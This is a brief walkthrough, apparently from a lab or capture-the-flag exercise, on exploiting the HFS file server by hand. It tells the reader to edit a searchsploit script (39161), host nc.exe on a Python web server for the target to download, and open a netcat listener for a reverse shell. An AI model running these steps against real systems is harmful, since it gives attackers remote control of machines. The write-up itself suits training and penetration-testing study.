### Exploit HFS Manually

---

##### With Searchsploit, we found a script :

However, we have to modify some informations like IP address and port in the script that will be used by the nc listener

##### Set up a http server hosting nc for windows target :

- python -m SimpleHTTPServer
- nc for windows can be found : */usr/share/windows-resources/binaries/nc.exe*

##### We can run the python script with the following arguments & prepare ower netcat listener :

- python 39161.py 10.10.10.10 80
- nc -nvlp 4444 (the same specify in the python script. It will wait for the reverse connection from the target)
